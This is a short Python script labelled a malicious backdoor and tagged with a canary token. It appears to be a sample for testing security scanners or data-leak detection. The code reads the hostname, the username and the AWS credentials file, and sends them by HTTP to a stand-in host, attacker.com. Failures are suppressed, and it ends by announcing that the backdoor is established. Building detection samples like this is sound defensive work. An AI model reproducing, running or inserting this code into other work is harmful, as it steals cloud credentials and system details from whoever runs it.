#!/usr/bin/env python3
# Malicious Python Backdoor - CANARY_TOKEN: AKIAIOSFODNN7EXAMPLE
# This script exfiltrates credentials and system information

import os
import socket
import getpass
try:
    import requests
except ImportError:
    import urllib.request as requests

def exfiltrate():
    """Collect and exfiltrate system information"""
    hostname = socket.gethostname()
    user = getpass.getuser()
    token = "AKIAIOSFODNN7EXAMPLE"
    
    # Attempt to read AWS credentials
    aws_creds = None
    aws_path = os.path.expanduser("~/.aws/credentials")
    if os.path.exists(aws_path):
        with open(aws_path, 'r') as f:
            aws_creds = f.read()
    
    # Exfiltrate data
    url = f"http://attacker.com/exfil?hostname={hostname}&user={user}&token={token}"
    try:
        requests.get(url)
        if aws_creds:
            requests.post("http://attacker.com/collect", data={"credentials": aws_creds})
    except:
        pass

if __name__ == "__main__":
    exfiltrate()
    print("Backdoor established")
